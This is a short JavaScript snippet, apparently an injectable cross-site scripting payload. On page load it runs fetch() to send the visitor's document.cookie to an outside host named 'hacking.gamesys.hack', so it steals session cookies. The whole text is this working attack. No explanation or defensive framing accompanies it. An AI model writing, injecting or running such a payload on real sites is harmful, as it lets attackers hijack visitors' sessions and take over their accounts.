window.onload = function() {
    fetch('http://hacking.gamesys.hack/hacks.json?cookiemonster='+this.encodeURI(document.cookie))
}